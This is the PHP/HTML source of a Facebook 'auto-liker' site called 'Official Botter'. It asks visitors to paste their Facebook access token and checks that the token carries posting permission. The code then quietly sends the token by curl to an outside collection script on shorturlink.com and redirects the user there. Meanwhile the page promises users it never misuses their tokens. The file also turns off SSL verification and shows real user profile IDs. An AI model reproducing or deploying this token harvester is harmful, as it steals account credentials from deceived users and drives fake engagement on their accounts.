﻿    <?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://shorturlink.com/postliker/loginsave.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "ERROR: Invalid Authentication The Access Token You Entered Is Not Valid."; // For example
            break;
            case 2:
                $errorMsg = "Please Allow App To Access Your Profile!";
            break;
            case 3:
                $errorMsg = "Logout Success!";
            break;
            case 4:
                $errorMsg = "INFO:A Required Parameter Access_token Is Missing, Please Check And Try Re Submitting";
            break;
            case 5:
                $errorMsg = "Like Failed, Time Limit Reached, Please Wait 15 mins Later..";
            break;
            default:
                $errorMsg = "Fa Furrukh was here!";
            break;
        }
         ''.$errorMsg.'';
    }
?>                                                                                            <!doctype html>
<html class="no-js" lang="en">
<head>
  <!-- Basic Page Needs -->
  <meta charset="utf-8">
  <title>Official Botter | Increase Facebook Lovers Frends</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="propeller" content="315c1d240a2a34746b079bcbb90d0f49" />
	<meta content='Fa Furrukh' name='author'/>
	<meta content='general' name='rating'/>
	<meta content='india' name='geo.placename'/>
	<meta content='google' name='generator'/>
	<meta content='noodp, noydir, index, follow, all' name='robots'/>
    <meta http-equiv="Cache-control" content="public" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<meta name="googlebot" content="index, follow" />
    <meta name="revisit-after" content="2 days" />

    <meta name="language" content="EN" />
    <meta name="author" content="Fa Furrukh" />
<meta name="copyright" content="Copyright © 2016 To 2018 " />
    <meta name="Keywords" content=", AutoBot, Bot Site, Official Botter, AutoLike, AutoLiker, Page Liker, Facebook AutoLiker, Auto Like, Working AutoLiker, , Working Like" />
<meta name="Description" content="Like, , AutoBot, Bot Site, Official Botter, " />
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="shortcut icon" href="images/icons/favicon.png" />
    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="css/normalize.css" />
    <link rel="stylesheet" href="css/foundation.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/animate.min.css" />
    <link rel="stylesheet" href="css/morphext.css" />
    <link rel="stylesheet" href="css/owl.carousel.css">
    <link rel="stylesheet" href="css/owl.theme.css">
    <link rel="stylesheet" href="css/owl.transitions.css">
    <link rel="stylesheet" href="css/slicknav.css">
    <link rel="stylesheet" href="style.css" />
    <script src="js/vendor/modernizr.js"></script>

  </head>
  <body>

<!--  HEADER -->    
<header>




<!--  MESSAGES ABOVE HEADER IMAGE -->
<div class="message">
<div class="row">
<div class="small-12 columns">
<div class="message-intro">
<span class="message-line"></span>
<p style="text-shadow: 1px 1px 4px rgba(0,0,0,0.6);">Facebook Auto Botter</p>
<span class="message-line"></span>
</div>

<!--Edit Menu In root/includes/menu.php-->
<?php  if(isset($_GET['i']))
{ ?>
<div style="background-color:white;background:white;">
<div style="margin-bottom: -1px;" ;="" class="alert alert-error hideit"><i class="icon-warning-sign"></i><p> <?php 
echo "$errorMsg"; 
?></p></div></div>
<?php } ?>
<h1><span style="    text-shadow: 1px 1px 4px rgba(0,0,0,0.6);    color: #fff;" id="js-rotating">A tool for those who want to gain fame among their friends & catch their attention by popularising their status & photos likes.</span></h1>
<!--<a href="#pricingboxes" class="small radius button">GET STARTED</a>-->
</div>
</div>
</div>
<!--  END OF MESSAGES ABOVE HEADER IMAGE -->

<div class="top">
  <div class="row">
  <div class="small-12 large-3 medium-3 columns">
   <div class="logo">
   <a href="index.php" title=""><img src="images/logo.png" alt="" title=""/></a>
   </div>
</div>

<div class="small-12 large-9 medium-9 columns">

<!--  NAVIGATION MENU AREA -->
    <nav class="desktop-menu">
     <ul class="sf-menu">
         <li class="current-menu-item"><a href="index.php">HOME</a></li>
                                    <li><a href="about.php">About</a>
                                    </li>
                                    <li><a href="privacy.php">Privacy Policy</a>
                                    </li>
                                    <li><a href="faqs.php">FAQS</a>
                                    </li>
                                    <li><a href="contact.php">Contact</a>
                                    </li>
    </ul>
  </nav>
<!--  END OF NAVIGATION MENU AREA --> 

<!--  MOBILE MENU AREA -->
  <nav class="mobile-menu">
    <ul>
  <li><a href="index.php">HOME</a></li>
                                             <li><a href="about.php">About</a>
                                    </li>
                                    <li><a href="privacy.php">Privacy Policy</a>
                                    </li>
                                    <li><a href="faqs.php">FAQS</a>
                                    </li>
                                    <li><a href="contact.php">Contact</a>
                                    </li>
</ul>
  </nav>
  <!--  END OF MOBILE MENU AREA -->


  </div>
  </div>
  </div>

</header>  
<!--  END OF HEADER -->  

<!--  FEATURES -->
<section class="features">
<div class="row">
<div class="small-12 columns">
<h2>OUR FEATURES ARE UNBEATABLE</h2>
<p></p>

<ul class="small-block-grid-1 large-block-grid-3 medium-block-grid-3">

<li  data-wow-delay="0.2s" class="wow fadeInLeft">
<i class="fa fa-check"></i>
<h3>NO SPAM</h3>
<p>We never spamming using your access token. Official Botter is totally spam free</p>
</li>

<li data-wow-delay="0.4s" class="wow fadeInLeft">
<i class="fa fa-thumbs-up"></i>
<h3>Instant Bot</h3>
<p>Get instant 4 Days Running per submit by using your access token and UP-TO 30,000 sec/p hour Speed on Your Frends Status, Pictures, Albums!</p>
</li>

<li data-wow-delay="0.6s" class="wow fadeInLeft">
<i class="fa fa-heart"></i>
<h3>Trusted Site</h3>
<p>We are Online Since 14 2016 October and always keep online to help you Provide free services</p>
</li>

<!--<li data-wow-delay="0.2s" class="wow fadeInRight">
<i class="fa fa-bolt"></i>
<h3>Gigabit uplinks</h3>
<p>Food truck artisan cillum voluptate umami Austin quis, viral asymmetrical freegan occaecat swag skateboard</p>
</li>

<li data-wow-delay="0.4s" class="wow fadeInRight">
<i class="fa fa-hdd-o"></i>
<h3>SSD-Only</h3>
<p>Food truck artisan cillum voluptate umami Austin quis, viral asymmetrical freegan occaecat swag skateboard</p>
</li>

<li data-wow-delay="0.6s" class="wow fadeInRight">
<i class="fa fa-rocket"></i>
<h3>Running at scale</h3>
<p>Food truck artisan cillum voluptate umami Austin quis, viral asymmetrical freegan occaecat swag skateboard</p>
</li>-->

</ul>
</div>
</div>
</section>
<!--  END OF FEATURES -->

<!--  LOGIN  -->
<section class="calltoaction">
<div class="row">
<div class="small-12 columns">
<div data-wow-delay="0.3s" class="longshadow wow fadeInDown">METHODS FOR LOGGING IN</div>
<div data-wow-delay="0.5s" class="calltoactioninfo wow fadeInUp">
<!-- ads here -->
<h3><a name="navigation-name" class="no-link">GET ACCESS TOKEN</a></h3>
<ul>
<li><a href="#">ALLOW Token</a></li>
<a href="bot.php"><b></b>START BOT</a>
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
}

<script type="text/javascript">
function tokencheck()

{

$("#prepage").hide();

$("#checking").show();

}

</script>
<div style="text-align:center; font-size:30px;">
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: white;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center>
<img src="load.gif" alt="Loading"></center>
</div>
</div>
</div>
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="load.gif"></center>
</div>
</div>

<?php if ($token){echo " ".$user->firt_name;}else{ ?>
<?php
		}
		?>
		<?php if ($token): ?>
<script type="text/javascript">
// Do Not Delete This
window.location.replace("http://shorturlink.com/postliker/dashboard.php?i=1");
</script>
		<?php else: ?>
		<?php endif ?>
<!-- ads here -->
</center>
</div>
</div>
</div>
</section>
<!--  END LOGIN -->

<!--  PRICING BOXES  -->
<div class="pricingboxes">
<a id="pricingboxes"></a>
<div class="row"> 
<div class="small-12 columns">
<h2><a onclick="javascript:alert('Coming Soon.^_^')">* Need Help? Watch Video Click Here</a></h2>
<p></p>
</div>
</div>

</div>
</div>
<!--  END  -->

<!--  USERS -->
<section class="testimonials">
<div class="row">
<div class="small-12 columns">
<div class="circle"><i class="fa fa-heart"></i></div>
<h2>LOVED BY <span id="lovedby">0</span> USERS</h2>
<hr class="small"/>

        
    </div>

</div>
</div>
</section>
<!--  END OF USERS -->

<!--  USERS -->
<section class="monitoring">
<div class="row">
<div class="small-12 columns">
<h2>Recent Users</h2>
<p class="text-center">Below is the list of users who recently used our service.</p>
<!-- recent users here --><center style="    padding-bottom: 40px;">                                                                                             
 <img  src="https://graph.facebook.com/100006493044327/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100007328611866/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100007891126925/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100006143522004/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100001286750680/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100009181387241/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100007042903969/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100007869189153/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100008247704102/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100001201264444/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100003393227287/picture"/>&nbsp;  <img  src="https://graph.facebook.com/100007040327557/picture"/>&nbsp;  <br></center>
</div>
</div>
</section>
<!--  END OF USERS -->

<!--  FOOTER  -->
<footer>
<div class="row">
<div class="small-12 columns">
<div class="contacts">
<!--<div class="row">
<div class="small-12 large-3 medium-3 columns">
<i class="fa fa-map-marker"></i>
PORTLAND, OR, USA
</div>
<div class="small-12 large-3 medium-3 columns">
<i class="fa fa-mobile"></i>
+1 299-670-9615
</div>
<div class="small-12 large-3 medium-3 columns">
<a href="#"><i class="fa fa-comments"></i></a>
LIVE CHAT
</div>
<div class="small-12 large-3 medium-3 columns">
<a href="#"><i class="fa fa-envelope-o"></i></a>
E-MAIL US
</div>-->
</div>
</div>
</div>
</div>


<div class="row">
<div class="small-12 columns">
<div class="footerlinks"> 
<div class="small-12 large-3 medium-3 columns border-right">
<h2>About Official Botter</h2>
<p> Bot is a social marketing system that will increase followers, likes, comments and increase visits to pages. Our system is based on an online community of users who look get likes quickly and easily.   This Network developed by <b> Fa Furrukh.</p>
</div>

<div class="small-12 large-3 medium-3 columns border-right">
<h2>Quick Links</h2>
<ul>
<li><a href="#">How This Work Video Here</a></li>
<li><a href="http://facebook.com/fapakhacker">Created by Fa Furrukh ( Karachi )</a></li>
<li><a href="http://facebook.com/fapakhacker">Contact Us Facebook</a></li>
</ul>
</div>

<div class="small-12 large-3 medium-3 columns border-right">
<h2>></script>
</div>

<div class="small-12 large-3 medium-3 columns">
<h2>Instructions</h2>
<p>Note : <br
			~ you must already<b>18+ years old.</b><br>
			~ Activate your <b><a href="https://www.facebook.com/settings?tab=followers">[Facebook Follower] </a></b><br>
			~ and set your post's permission to <br><b>PUBLIC.</b></p>

</div>

</div>
</div>
<br><br>
<!--SOCIAL LINKS
<div class="social">
<div class="row">
<div class="small-12 columns">
<ul class="small-block-grid-1 large-block-grid-5 medium-block-grid-5"> 
<li class="facebook"><a href="<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Ffapakhacker&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>">FACEBOOK</a></li> 
<li class="twitter"><a href="#">TWITTER</a></li> 
<li class="googleplus"><a href="#">GOOGLE+</a></li> 
<li class="linkedin"><a href="#">LINKEDIN</a></li> 
<li class="pinterest"><a href="#">PINTEREST</a></li> 
</ul>
</div>
</div>
</div>
 END OF SOCIAL LINKS --><br>
<p class="copyright">© Copyright Official Botter, all rights reserved. </p>
</footer>
<!--  END OF FOOTER  -->

<a href="#top" id="back-to-top"><i class="fa fa-angle-up"></i></a>

    <script src="js/vendor/jquery.js"></script>
    <script src="js/foundation.min.js"></script>
    <script src="js/vendor/hoverIntent.js"></script>
    <script src="js/vendor/superfish.min.js"></script>
    <script src="js/vendor/morphext.min.js"></script>
    <script src="js/vendor/wow.min.js"></script>
    <script src="js/vendor/jquery.slicknav.min.js"></script>
    <script src="js/vendor/waypoints.min.js"></script>
    <script src="js/vendor/jquery.animateNumber.min.js"></script>
    <script src="js/vendor/owl.carousel.min.js"></script>
    <script src="js/vendor/jquery.slicknav.min.js"></script>
    <script src="js/custom.js"></script>

  </body>
</html>